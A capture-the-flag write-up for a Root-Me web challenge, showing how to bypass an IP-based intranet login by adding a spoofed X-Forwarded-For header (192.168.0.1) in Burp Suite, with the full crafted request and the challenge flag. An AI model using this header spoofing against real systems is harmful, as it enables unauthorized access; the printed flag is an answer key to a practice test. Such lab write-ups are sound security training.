---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 2
---

> Dear colleagues,
> We’re now managing connections to the intranet using private IP addresses, so it’s no longer necessary to login with a username / password when you are already connected to the internal company network.
> Regards,
> The network admin

![1](https://github.com/Knign/Write-ups/assets/110326359/f062cc6a-5da5-4ea4-9c8e-1d2322eaa2d2)

Let's intercept this request in Burpsuite.

![2](https://github.com/Knign/Write-ups/assets/110326359/bcc2159c-e705-443c-8c0f-97195a665096)

Next, we can send this request to the `Repeater`.

## X-Forwarded-For
```
X-Forwarded-For: <client>, <proxy1>, <proxy2>
```
It is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through a proxy server.

We can add this header and set it's value to `192.168.0.1` as the origin should be connected to the internal company network.
## HTTP Request
```
POST /web-serveur/ch68/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
X-Forwarded-For: 192.168.0.1
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge01.root-me.org/web-serveur/ch68/
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://challenge01.root-me.org
DNT: 1
Connection: close
Cookie: _ga_SRYSKX09J7=GS1.1.1697290591.1.1.1697292257.0.0.0; _ga=GA1.1.1863804672.1697290591
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```
For the final step we have to send this request to the server.

![3](https://github.com/Knign/Write-ups/assets/110326359/ce4586b6-7236-4f0e-b82a-b452253f3230)

## Flag
```
Ip_$po0Fing
```
